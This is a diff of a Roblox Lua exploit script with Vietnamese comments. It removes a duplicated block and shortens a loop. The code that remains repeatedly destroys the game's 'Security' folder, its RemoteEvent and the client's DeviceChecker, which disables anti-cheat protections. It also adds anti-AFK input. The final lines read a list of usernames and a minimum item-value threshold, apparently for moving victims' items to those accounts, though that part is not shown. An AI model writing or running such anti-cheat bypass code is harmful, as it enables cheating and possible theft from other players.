@@ -31,9 +31,9 @@ local function deleteDeviceChecker()
     end
 end
 
--- Chạy liên tục trong 5 giây để đảm bảo các phần tử bị xóa
+-- Chạy liên tục trong 2 giây để đảm bảo các phần tử bị xóa
 task.spawn(function()
-    for i=1, 50 do -- 50 lần, mỗi lần 0.1 giây = 5 giây
+    for i=1, 20 do -- 20 lần, mỗi lần 0.1 giây = 2 giây
         pcall(deleteSecurityObjects)
         pcall(deleteDeviceChecker)
         task.wait(0.1)
@@ -46,57 +46,7 @@ plr.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
--- Các biến và phần còn lại của script của bạn...
--- (Bạn có thể giữ nguyên phần còn lại của script)
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then return end
-_G.scriptExecuted = true
-
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-local VirtualUser = game:GetService("VirtualUser")
-
--- Hàm xóa các phần tử bảo mật
-local function deleteSecurityObjects()
-    local securityFolder = ReplicatedStorage:FindFirstChild("Security")
-    if securityFolder then
-        if securityFolder:FindFirstChild("RemoteEvent") then
-            securityFolder.RemoteEvent:Destroy()
-        end
-        if securityFolder:FindFirstChild("") then
-            securityFolder[""]:Destroy()
-        end
-        -- Xóa luôn thư mục Security
-        securityFolder:Destroy()
-    end
-end
-
-local function deleteDeviceChecker()
-    local deviceChecker = Players.LocalPlayer.PlayerScripts.Client:FindFirstChild("DeviceChecker")
-    if deviceChecker then
-        deviceChecker:Destroy()
-    end
-end
-
--- Chạy liên tục trong 2 giây để đảm bảo các phần tử bị xóa
-task.spawn(function()
-    for i=1, 20 do -- 20 lần, mỗi lần 0.1 giây = 2 giây
-        deleteSecurityObjects()
-        deleteDeviceChecker()
-        task.wait(0.1)
-    end
-end)
-
--- AFK koruması
-plr.Idled:Connect(function()
-    VirtualUser:CaptureController()
-    VirtualUser:ClickButton2(Vector2.new())
-end)
-
--- Các biến và phần còn lại của script của bạn...
+-- Các phần còn lại của script của bạn...
 
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
